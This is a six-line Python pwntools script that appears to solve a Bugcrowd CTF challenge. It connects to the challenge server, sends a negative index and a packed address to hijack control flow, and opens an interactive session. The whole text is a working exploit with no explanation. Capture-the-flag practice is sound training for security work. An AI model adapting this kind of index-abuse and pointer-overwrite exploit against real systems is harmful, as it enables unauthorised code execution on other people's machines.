from pwn import *
#p=process('./chal')
p=remote('challenges.bhusa.bugcrowdctf.com', 8081)
p.sendline(b'-9')
p.sendline(p64(0x4007f7))
p.interactive()
